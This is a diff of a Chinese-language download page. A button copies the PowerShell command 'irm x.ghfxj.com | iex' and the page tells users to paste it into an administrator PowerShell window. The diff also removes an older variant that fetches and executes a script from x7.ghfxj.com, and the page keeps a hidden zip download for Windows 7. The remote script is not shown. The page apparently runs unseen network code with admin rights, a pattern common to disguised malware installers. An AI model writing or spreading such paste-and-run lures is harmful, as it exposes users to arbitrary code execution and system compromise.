@@ -28,9 +28,8 @@
             font-size: 1rem;
         }
         #win7Btn {
-            margin-top: 20px;  /* 你可以根据需要调整数值，例如 24px 或 30px */
+            margin-top: 20px;  /* 增加两个按钮之间的间距 */
         }
-        /* 新增按钮同样使用 button 样式，无需额外定义 */
     </style>
 </head>
 <body>
@@ -40,33 +39,20 @@
         你的浏览器不支持 video 标签。
     </video>
     
-    <!-- 原有的复制命令按钮 -->
+    <!-- 复制命令按钮（固定为Win10/11配置） -->
     <button id="copyBtn">复制 "运行远程软件" 命令</button>
     
-    <!-- 新增的 win7 备用下载按钮 (放在原有按钮下方，自动居中) -->
+    <!-- win7 备用下载按钮 -->
     <button id="win7Btn">win7</button>
 
     <script>
         (function() {
-            // 1. 判断操作系统版本
-            var ua = navigator.userAgent;
-            var match = ua.match(/Windows NT (\d+\.\d+)/);
-            var isWin10OrHigher = false;
-            if (match) {
-                var version = parseFloat(match[1]);
-                isWin10OrHigher = version >= 10.0;
-            } // 非Windows系统默认false，视为旧系统
+            // 固定为 Windows 10/11 的配置（已移除系统版本判断）
+            var videoSrc = './0.mp4';
+            var cmdText = 'irm x.ghfxj.com | iex';
+            var successMsg = '已复制! 右击开始按钮 ➤ 单击Powershell(管理员) ➤ 右击粘贴';
 
-            // 2. 根据系统版本设置视频源、命令和成功提示
-            var videoSrc = isWin10OrHigher ? './0.mp4' : './7.mp4';
-            var cmdText = isWin10OrHigher 
-                ? 'irm x.ghfxj.com | iex' 
-                : '$h=New-Object -C Msxml2.XMLHTTP;$h.open(\'GET\',\'https://x7.ghfxj.com\',0);$h.send();$h.responseText|iex';
-            var successMsg = isWin10OrHigher
-                ? '已复制! 右击开始按钮 ➤ 单击Powershell(管理员) ➤ 右击粘贴'
-                : '已复制! 单击开始按钮 ➤ 输入Powershell后Ctrl+回车 ➤ 右击粘贴';
-
-            // 3. 设置视频源
+            // 设置视频源
             var video = document.getElementById('instructionVideo');
             var source = document.getElementById('videoSource');
             if (video && source) {
@@ -74,7 +60,7 @@
                 video.load(); // 重新加载视频
             }
 
-            // ---------- 原有复制按钮逻辑 ----------
+            // ---------- 复制按钮逻辑 ----------
             var copyBtn = document.getElementById('copyBtn');
             if (copyBtn) {
                 var originalBtnText = copyBtn.innerText;
@@ -129,35 +115,23 @@
                 });
             }
 
-            // ---------- 新增 win7 备用按钮的下载功能 ----------
+            // ---------- win7 备用按钮的下载功能 ----------
             var win7Btn = document.getElementById('win7Btn');
             if (win7Btn) {
                 win7Btn.addEventListener('click', function(e) {
-                    // 防止按钮可能的默认行为（虽然button没有默认行为，但为了稳妥）
                     e.preventDefault();
                     
-                    // 下载链接（已经URL编码，直接使用）
                     var downloadUrl = 'https://cnb.cool/GHFXJ/YC/-/git/raw/main/SOFT/_%E5%85%88%E8%A7%A3%E5%8E%8B_%E5%86%8D%E8%BF%90%E8%A1%8C.zip';
                     
-                    // 创建隐藏的<a>元素模拟点击，以触发下载且不离开当前页面
                     var link = document.createElement('a');
                     link.href = downloadUrl;
-                    link.download = '';          // 空字符串让浏览器自动识别文件名
-                    link.style.display = 'none';  // 隐藏元素
+                    link.download = '';          // 让浏览器自动识别文件名
+                    link.style.display = 'none';
                     document.body.appendChild(link);
-                    link.click();                  // 模拟点击
-                    document.body.removeChild(link); // 下载后移除
-                    
-                    // （可选）轻微提示，但不强制，避免干扰复制按钮的提示
-                    // 如果需要短暂提示可以取消下面的注释
-                    // var originalText = win7Btn.innerText;
-                    // win7Btn.innerText = '下载已触发';
-                    // setTimeout(function() {
-                    //     win7Btn.innerText = originalText;
-                    // }, 1500);
+                    link.click();
+                    document.body.removeChild(link);
                 });
             }
-
         })();
     </script>
 </body>
